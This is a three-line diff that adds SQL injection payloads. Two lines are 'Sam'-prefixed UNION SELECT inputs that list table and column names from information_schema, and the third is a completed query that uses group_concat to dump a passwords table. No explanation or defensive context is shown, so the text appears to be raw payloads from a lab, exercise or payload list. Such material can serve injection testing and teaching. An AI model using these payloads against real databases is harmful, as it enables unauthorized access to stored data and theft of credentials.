@@ -1,0 +1,3 @@
+Sam' UNION SELECT table_name FROM information_schema.columns  #
+Sam' UNION SELECT column_name FROM information_schema.columns WHERE table_schema=database()  #
+SELECT name from employees WHERE name = 'Sam' UNION SELECT group_concat(pw) FROM passwords #'
